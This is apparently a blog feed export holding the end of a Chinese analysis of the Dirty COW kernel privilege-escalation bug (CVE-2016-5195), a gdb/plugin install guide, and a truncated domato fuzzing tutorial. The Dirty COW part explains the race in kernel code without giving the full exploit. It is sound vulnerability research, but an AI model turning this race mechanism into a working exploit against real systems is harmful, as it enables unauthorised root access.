在下面的函数中解释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： handle_pte_fault() -&gt; do_wp_page() -&gt; wp_page_reuse()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">wp_page_reuse</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pte_t</span> *page_table, <span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte,</span></span></span><br><span class="line"><span class="params"><span class="function">struct page *page, <span class="keyword">int</span> page_mkwrite,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> dirty_shared)</span></span></span><br><span class="line"><span class="function">__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> VM_FAULT_WRITE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="faultin-page-1"><a href="#faultin-page-1" class="headerlink" title="faultin_page"></a>faultin_page</h5><p>回到faultin_page函数，由于handle_mm_fault()返回了 VM_FAULT_WRITE，在代码中判断如果ret中VM_FAULT_WRITE被置位且VMA不可写的情况下清除flag的FOLL_WRITE标记。</p><p>VM_FAULT_WRITE表示我们尝试写入了old_page但old_page是只读的。同时也表示我们完成了COW的步骤，通过将vma的FOLL_WRITE标志取消，表示我们对new_page的读写将<strong>没有限制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment"> * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment"> * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment"> * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment"> * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment"> * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>faultin_page</code>函数返回0。回到__get_user_pages函数。</p><h5 id="get-user-pages-1"><a href="#get-user-pages-1" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>调用follow_page_mask 函数，此时foll_flags中的 FOLL_WRITE 标志位0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();</span><br><span class="line">                page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                ..</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages</span><br></pre></td></tr></table></figure><h4 id="（3）madvise与第三次write"><a href="#（3）madvise与第三次write" class="headerlink" title="（3）madvise与第三次write"></a>（3）madvise与第三次write</h4><h5 id="get-user-pages-2"><a href="#get-user-pages-2" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>此时是第三次走到了__get_user_pages 函数，这次的执行与前两次略有不同，在执行cond_resched 函数时，由于madvise线程的介入，madvise(dontneed)系统调用在内核里的 zap_page_range()函数会去解除页的映射关系。</p><p>此时回到write的线程，调用follow_page_mask来获取page结构，由于page已经被madvise 线程释放掉了，该page的pte entry不是有效的pte并且PRESENT也没有被置为，所以follow_page_mask返回NULL，触发缺页中断。注意此时FOLL_WRITE已经被置为0了，不需要检查写权限了，所以这里不是写缺页中断而是读缺页中断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();<span class="comment">// 由于madvise线程的介入，解除了页的映射关系。</span></span><br><span class="line">                page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                ..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="handle-pte-fault-2"><a href="#handle-pte-fault-2" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>这里判断了缺页的类型，由于该页的 pte entry 不是有效的、PRESENT 位也没被置位，所以跟入do_fault 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;<span class="comment">// 这里的PRESENT 标志位为0，走入该分支</span></span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;<span class="comment">// pte entry失效，走入该分支</span></span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,<span class="comment">// 跟进</span></span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault"></a>do_read_fault</h5><p>由于是读错误缺页中断，所以跳转到do_read_fault 函数。这里直接将文件的内容映射到page chae中。（注意之前madvise 释放的是处理cow过程中产生的匿名page）。这样一个可写的page cache已经新鲜出炉了！，之后在__get_user_pages 函数在做一次retry就可以正确的返回该页的page结构了，之后使用kmap重新映射然后写入想要的内容将该页dirty，系统回写机制会将内容写入到这个只读文件中，整个流程完成了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： handle_pte_fault() -&gt; do_fault() -&gt; do_read_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line">...</span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">...</span><br><span class="line">do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><h4 id="详细总结"><a href="#详细总结" class="headerlink" title="详细总结"></a>详细总结</h4><p>dirtycow 程序目的是要写一个只读文件的内容（vma -&gt; flags 为只读属性），由于 page cache 的机制，写的是文件对应的page cache。</p><p>但由于第一次去写，页不在内存中并且 pte entry 不是有效的，所以调用了 do_cow_page()函数去处理COW，这时候会将该文件的内容映射到 page cache 中，然后把 page cache 的内容复制到了一个新的匿名页面中。这个新匿名页面的 pte entry 属性是 Dirty | RDONLY。</p><p>之后再去尝试 follow_page()，但是不成功，那是因为 FOLL_WRITE 和 pte entry 是 RDONLY，所以再去来一次写错误缺页中断。这回跑到 do_wp_page()里，该函数看到这个页是个匿名页面并且可以复用，那 么尝试修改 pte entry 的 write 属性，但是不成功，因为 vma-&gt;flags 只读属性的紧箍咒还在呢。 do_wp_page()返回 VM_FAULT_WRITE 了，在返回途中 faultin_page()把 FOLL_WRITE 给弄丢 了，这是这个问题的关键之一。</p><p>返回到__get_user_pages()里要求再来一次 follow_page()。在这次 follow_page()之前，小李飞刀 madvise 线程杀到，把该页给释放了，这是该问题的另外一个关键点。那么 follow_page()必然失败了，这时再造一次缺页中断， 注意这次是只读了，因为 FOLL_WRITE 之前被废了。这样缺页中断重新从文件中读取了 page cache 内容，并且获取了该 page cache 控制权，再往该 page cache 写东西，并且该页设置为 PG_dirty，系统回写机制稍后将完成最终写入了。</p><p>如果没有madvise 线程，那么cow生成的只读匿名页面将不会被释放，虽然该匿名页面只读，但是直接使用kmap可以对其进行强制写。虽然可以强制写，但是匿名页面最后的内容最终也不会同步到page cache中，所以也无法达到写只读文件的目的。</p><h4 id="简单归纳"><a href="#简单归纳" class="headerlink" title="简单归纳"></a>简单归纳</h4><h5 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt;write /proc/self/mem 写入一块只读内存</span><br><span class="line">-&gt;page fault（页不在内存，pte entry无效。之后COW复制到一个匿名内存页）</span><br><span class="line">-&gt;page fault（写错误，由于vma_flags只读，do_wp_page尝试将页属性改为可写失败，返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE）</span><br><span class="line">-&gt;对COW生成的匿名页进行强制写（即使该匿名页内存只读，通过内核定位可绕过），最终该匿名页被释放，无事发生。</span><br></pre></td></tr></table></figure><h5 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt;write /proc/self/mem 写入一块只读内存</span><br><span class="line">-&gt;page fault（页不在内存，pte entry无效。之后COW复制到一个匿名内存页）</span><br><span class="line">-&gt;page fault（写错误，由于vma_flags只读，do_wp_page尝试将页属性改为可写失败，返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE）</span><br><span class="line">-&gt;madivse释放了COW生成的匿名页</span><br><span class="line">-&gt; 由于内存释放导致再次follow_page失败，遂再次申请内存，由于FOLL_WRITE被丢掉，导致可以写只读page cache，回写机制导致修改了真实文件。</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a class="link"   href="https://xz.aliyun.com/t/450" >阿里云笑然师傅漏洞分析报告<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619" >漏洞补丁链接<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344" >redhat bug跟踪<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/" >clang裁缝店 条件竞争学习 之 DirtyCow分析<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/jasonLee_lijiaqi/article/details/80967912" >qemu+gdb调试linux内核全过程<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98" >虚拟内存维基百科<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/324210723" >x86段寄存器和分段机制<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/michael2012zhao/article/details/5554023" >“段寄存器”的故事<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zofun.github.io/2020/05/15/%E6%AE%B5%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" >段页式内存管理<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://bbs.pediy.com/thread-264199.htm" >看雪 Linux内核[CVE-2016-5195] (dirty COW)原理分析<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://atum.li/2016/10/25/dirtycow/" >Atum CVE-2016-5195 DirtyCow:Linux内核提权漏洞分析<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf" >奔跑吧-Linux内核<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/27604276" >从内核角度分析Dirty Cow原理<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >Linux Internals: How /proc/self/mem writes to unwritable memory<i class="fas fa-external-link-alt"></i></a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2016-5195-dirtycow-linux本地提权漏洞分析&quot;&gt;&lt;a href=&quot;#CVE-2016-5195-dirtycow-linux本地提权漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2016-5195 dirtyc</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="linux" scheme="https://fa1lr4in.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>gdb9.2源码安装以及相关插件安装</title>
    <link href="https://fa1lr4in.github.io/2022/04/19/gdb9-2%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"/>
    <id>https://fa1lr4in.github.io/2022/04/19/gdb9-2%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/</id>
    <published>2022-04-19T07:00:57.000Z</published>
    <updated>2022-04-19T09:13:57.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu源码安装gdb9-2以及gdb常用插件安装"><a href="#Ubuntu源码安装gdb9-2以及gdb常用插件安装" class="headerlink" title="Ubuntu源码安装gdb9.2以及gdb常用插件安装"></a>Ubuntu源码安装gdb9.2以及gdb常用插件安装</h1><h2 id="一、为什么要源码编译安装gdb"><a href="#一、为什么要源码编译安装gdb" class="headerlink" title="一、为什么要源码编译安装gdb"></a>一、为什么要源码编译安装gdb</h2><p>有时Ubuntu包管理器最新的gdb版本较老，在本人环境中为8.1.1，有bug影响了正常调试，故进行升级</p><h2 id="二、gdb安装"><a href="#二、gdb安装" class="headerlink" title="二、gdb安装"></a>二、gdb安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt remove gdb</span><br><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.gz</span><br><span class="line">tar xvf gdb-9.2.tar.gz</span><br><span class="line">mkdir build &amp;&amp; <span class="built_in">cd</span> build</span><br><span class="line">../configure --prefix=/root/tools/gdb --with-python=/usr/bin/python3<span class="comment">#这个路径随便指定，不过下面要用到，这个路径中存放编译生成的二进制文件</span></span><br><span class="line">make -j12</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">export</span> PATH=/root/tools/gdb/bin:<span class="variable">$PATH</span></span><br><span class="line">ln -s /root/tools/gdb/bin/gdb /usr/bin/gdb</span><br></pre></td></tr></table></figure><h2 id="三、插件安装"><a href="#三、插件安装" class="headerlink" title="三、插件安装"></a>三、插件安装</h2><h3 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef</span><br><span class="line"><span class="comment"># 将gef目录下的gef.py添加进/root/.gdbinit中，内容如下</span></span><br><span class="line"><span class="comment"># source /root/tools/gef/gef.py</span></span><br></pre></td></tr></table></figure><h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo <span class="comment">#./setup.sh</span></span><br><span class="line"><span class="comment"># 如果显示异常，检查.gdbinit文件</span></span><br><span class="line"><span class="comment"># source /root/tools/pwndbg/gdbinit.py</span></span><br></pre></td></tr></table></figure><h3 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ubuntu源码安装gdb9-2以及gdb常用插件安装&quot;&gt;&lt;a href=&quot;#Ubuntu源码安装gdb9-2以及gdb常用插件安装&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu源码安装gdb9.2以及gdb常用插件安装&quot;&gt;&lt;/a&gt;Ubunt</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://fa1lr4in.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="环境搭建" scheme="https://fa1lr4in.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="linux" scheme="https://fa1lr4in.github.io/tags/linux/"/>
    
    <category term="gdb" scheme="https://fa1lr4in.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>domato101</title>
    <link href="https://fa1lr4in.github.io/2022/04/14/domato101/"/>
    <id>https://fa1lr4in.github.io/2022/04/14/domato101/</id>
    <published>2022-04-14T03:28:06.000Z</published>
    <updated>2022-04-19T09:13:33.741Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Domato101"><a href="#Domato101" class="headerlink" title="Domato101"></a>Domato101</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Domato是googleprojectzero团队成员<a class="link"   href="https://twitter.com/ifsecure" >Ivan Fratric<i class="fas fa-external-link-alt"></i></a>使用python开发的一款基于生成的DOM引擎fuzzer。</p><p>基于生成的fuzzer最困难的点之一在于创建的样本的语法或其他结构，作者尝试过手动创建以及从 Web 浏览器代码中自动提取的语法。</p><p>fuzzer由几个部分组成：</p><ul><li>一个给定语法结构可以生成样本的主引擎</li><li>一组用于生成 HTML、CSS 和 JavaScript 代码的语法规定。</li></ul><p>domato的使用非常简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># domato目前使用python3 </span></span><br><span class="line"><span class="comment"># https://github.com/googleprojectzero/domato</span></span><br><span class="line"><span class="comment"># 查看使用信息</span></span><br><span class="line">python3 generator.py -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成单个文件</span></span><br><span class="line">python3 generator.py -f &lt;output file&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成多个文件</span></span><br><span class="line">python generator.py -o &lt;output directory&gt; -n &lt;number of output files&gt;</span><br></pre></td></tr></table></figure><p>生成的html文件都比较大，目的可能是为了增加代码覆盖率，从而增加触发crash的概率。生成的样本因为会指定目录下，所以命名为 fuzz-<number>.html，例如 fuzz-00001.html、fuzz-00002.html 等。生成多个样本，只输入的语法文件需要加载和解析一次。</p><h3 id="使用bugid配合domato进行fuzz测试"><a href="#使用bugid配合domato进行fuzz测试" class="headerlink" title="使用bugid配合domato进行fuzz测试"></a>使用bugid配合domato进行fuzz测试</h3><p>下载bugid并开启页堆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BugId使用python2，如果python2和python3共存，可以将里面的可执行文件复制，并改名为python[2|3]</span></span><br><span class="line"><span class="comment"># https://github.com/SkyLined/BugId</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启对应应用程序的页堆：可以使用visual studio附带的gflags，也可以使用bugid带的脚本PageHeap.cmd。四大浏览器开启页堆命令如下。</span></span><br><span class="line"><span class="comment"># 使用PageHeap开启命令需要管理员权限</span></span><br><span class="line">PageHeap.cmd edge ON</span><br><span class="line">PageHeap.cmd chrome ON</span><br><span class="line">PageHeap.cmd firefox ON</span><br><span class="line">PageHeap.cmd msie ON</span><br></pre></td></tr></table></figure><p>本人暂时未搭建其他浏览器的环境，至测试了IE环境，下面的图片来自<a class="link"   href="https://blog.skylined.nl/20181017001.html" >blog<i class="fas fa-external-link-alt"></i></a></p><p>![#2 PageHeap](../../../study/【1】fa1lr4in_article/【2】FUZZ【进行中】/【1】FUZZ基础概念/【2】源码分析/domato/%232 PageHeap.png)</p><p>检测环境是否就绪</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;ok!&#x27;&quot;</span></span><br><span class="line">python.exe <span class="string">&quot;domato-master\generator.py&quot;</span></span><br><span class="line">BugId\BugId.cmd <span class="string">&quot;%WinDir%\system32\cmd.exe&quot;</span> --cBugId.bEnsurePageHeap=<span class="literal">false</span> -- /C ECHO ok!</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/domato101/image-20211223215213610.png" alt="image-20211223215213610"></p><p>有关下面两段代码的解释可以参考<a class="link"   href="https://blog.skylined.nl/20181017001.html" >here<i class="fas fa-external-link-alt"></i></a></p><ul><li>fuzz.cmd的主要功能就是调用了domato去生成了一些样本，并通过bugid进行逐个分析。</li><li>index.html则主要是测试浏览器对每个标签页的响应速度，一般测试为2s，根据自己的实际情况进行测试。</li></ul><h3 id="fuzz-cmd"><a href="#fuzz-cmd" class="headerlink" title="fuzz.cmd"></a>fuzz.cmd</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 